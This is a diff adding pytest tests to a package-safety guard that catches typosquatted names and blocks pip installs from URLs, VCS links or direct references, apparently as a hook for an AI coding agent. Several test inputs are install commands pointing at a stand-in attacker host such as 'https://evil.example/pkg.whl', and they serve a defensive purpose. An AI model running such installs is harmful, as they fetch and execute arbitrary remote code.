@@ -27,6 +27,7 @@ from package_doctor.guard import (
     one_edit_apart,
     parse_install_command,
     parse_requirement,
+    unresolvable_install_targets,
 )
 from package_doctor.models import (
     Confidence,
@@ -73,7 +74,43 @@ def test_near_miss_ignores_popular_names_and_very_short_ones():
     assert near_miss("httpx", POPULAR) is None
 
 
+def test_near_miss_checks_short_names_for_same_length_edits_only():
+    """A blanket skip at four characters or fewer left toml, lxml, yaml and
+    grpc with no typosquat coverage at all. The skip is now two characters,
+    and a three-or-four character name is compared only against candidates of
+    the same length: a substitution or an adjacent swap is what a squat on a
+    short name looks like, while an insertion or deletion at that length is
+    almost always a coincidence (`sixx` next to `six`)."""
+    assert near_miss("sx", ("six",)) is None, "two characters: skipped outright"
+    assert near_miss("gprc", ("grpc",)) == "grpc", "swap on a four-character name"
+    assert near_miss("tomI", ("toml",)) == "toml", "substitution on a four-character name"
+    assert near_miss("yml", ("yaml",)) is None, "deletion at three characters is excluded"
+    assert near_miss("attr", POPULAR) is None, "deletion from attrs is excluded at four"
+    assert near_miss("sixx", POPULAR) is None, "insertion onto six is excluded at four"
+    assert near_miss("nunpy", POPULAR) == "numpy", "above four, every edit shape counts"
+    assert near_miss("numpyy", POPULAR) == "numpy"
+
+
 # --- reading install commands ----------------------------------------------
+
+@pytest.mark.parametrize("command, names, unresolvable", [
+    ("pip install https://evil.example/pkg.whl", [], ["https://evil.example/pkg.whl"]),
+    ("pip install requests git+https://github.com/x/y", ["requests"],
+     ["git+https://github.com/x/y"]),
+    ("uv pip install ssh://git@host/x.git 'pillow==10.0.0'", ["pillow==10.0.0"],
+     ["ssh://git@host/x.git"]),
+    ("pip install ./vendor/thing", [], ["./vendor/thing"]),
+    ("pip install -r requirements.txt", [], []),
+    ("pip install requests", ["requests"], []),
+    ("pytest -q", [], []),
+])
+def test_urls_paths_and_vcs_targets_are_surfaced_rather_than_dropped(command, names, unresolvable):
+    """`parse_install_command` skips what no registry can check. Those
+    arguments are still the highest-risk form of install there is, so they
+    must come back somewhere a caller can act on them."""
+    assert parse_install_command(command) == names
+    assert unresolvable_install_targets(command) == unresolvable
+
 
 @pytest.mark.parametrize("command, expected", [
     ("pip install requests", ["requests"]),
@@ -244,6 +281,36 @@ def test_check_json_carries_level_reasons_and_provenance(monkeypatch, capsys):
     assert "first published" in row["reasons"][0]
 
 
+def test_check_blocks_a_direct_url_reference_instead_of_checking_the_real_name(monkeypatch, capsys):
+    """`requests @ https://evil.example/x.whl` installs whatever sits at the
+    URL. Looking up the PyPI `requests` and reporting it clean would be the
+    right name for the wrong artifact."""
+    called = []
+
+    class Stub:
+        def __init__(self, *a, **kw):
+            called.append(1)
+
+    monkeypatch.setattr(cli, "Analyzer", Stub)
+    code = cli.main(["check", "requests @ https://evil.example/x.whl", "--json", "--no-cache"])
+    payload = json.loads(capsys.readouterr().out)
+    row = payload["checks"][0]
+    assert code == cli.EXIT_FINDINGS
+    assert row["level"] == "block"
+    assert "https://evil.example/x.whl" in " ".join(row["reasons"])
+    assert row["provenance"]["found"] is None, "no registry entry was consulted"
+    assert not called, "nothing was looked up under the real name"
+
+
+def test_check_keeps_row_order_when_a_direct_reference_is_mixed_in(monkeypatch, capsys):
+    stub(monkeypatch, [finding("six"), finding("pillow")])
+    cli.main(["check", "six", "pyjwt @ git+https://github.com/x/y", "pillow",
+              "--json", "--no-cache"])
+    rows = json.loads(capsys.readouterr().out)["checks"]
+    assert [r["name"] for r in rows] == ["six", "pyjwt", "pillow"]
+    assert [r["level"] for r in rows] == ["ok", "block", "ok"]
+
+
 def test_check_rejects_a_malformed_requirement(monkeypatch, capsys):
     stub(monkeypatch, [])
     assert cli.main(["check", "not a requirement!!", "--no-cache"]) == cli.EXIT_USAGE
@@ -324,6 +391,63 @@ def test_hook_fails_open_when_the_lookup_explodes(monkeypatch, capsys):
     out, _ = capsys.readouterr()
     assert code == 0
     assert "allowed unchecked" in json.loads(out)["systemMessage"]
+
+
+def test_hook_blocks_a_url_install_without_a_lookup(monkeypatch, capsys):
+    """Installing straight from a URL used to produce the same silence as an
+    empty command. There is nothing to look up, and nothing to allow."""
+    called = []
+
+    class Stub:
+        def __init__(self, *a, **kw):
+            called.append(1)
+
+    monkeypatch.setattr(cli, "Analyzer", Stub)
+    code = run_hook(monkeypatch, hook_event("pip install https://evil.example/pkg.whl"))
+    out, err = capsys.readouterr()
+    assert code == 2
+    assert "https://evil.example/pkg.whl" in err and "URL or VCS" in err
+    assert not called and out == ""
+
+
+def test_hook_blocks_a_url_mixed_with_a_clean_package(monkeypatch, capsys):
+    stub(monkeypatch, [finding("requests")])
+    code = run_hook(monkeypatch, hook_event("pip install requests https://evil.example/pkg.whl"))
+    _, err = capsys.readouterr()
+    assert code == 2 and "evil.example" in err
+
+
+def test_hook_still_blocks_a_url_when_the_lookup_explodes(monkeypatch, capsys):
+    """Failing open is for the registry being down. A URL target never needed
+    the registry, so an outage must not become the way past the block."""
+    class Boom:
+        def __init__(self, *a, **kw):
+            pass
+
+        async def analyze_all(self, packages, now, progress=None):
+            raise RuntimeError("upstream exploded")
+
+    monkeypatch.setattr(cli, "Analyzer", Boom)
+    code = run_hook(monkeypatch, hook_event("pip install requests git+https://github.com/x/y"))
+    out, err = capsys.readouterr()
+    assert code == 2
+    assert "git+https://github.com/x/y" in err
+    assert "UNCHECKED requests" in err and "upstream exploded" in err
+    assert out == "", "exit 2 is the decision; no JSON needed"
+
+
+def test_hook_leaves_local_paths_alone(monkeypatch, capsys):
+    """`pip install -e .` is the developer's own code, not a remote fetch."""
+    called = []
+
+    class Stub:
+        def __init__(self, *a, **kw):
+            called.append(1)
+
+    monkeypatch.setattr(cli, "Analyzer", Stub)
+    assert run_hook(monkeypatch, hook_event("pip install -e .")) == 0
+    assert run_hook(monkeypatch, hook_event("pip install ./vendor/thing")) == 0
+    assert not called and capsys.readouterr().out == ""
 
 
 def test_hook_can_be_told_to_block_on_warnings(monkeypatch, capsys):
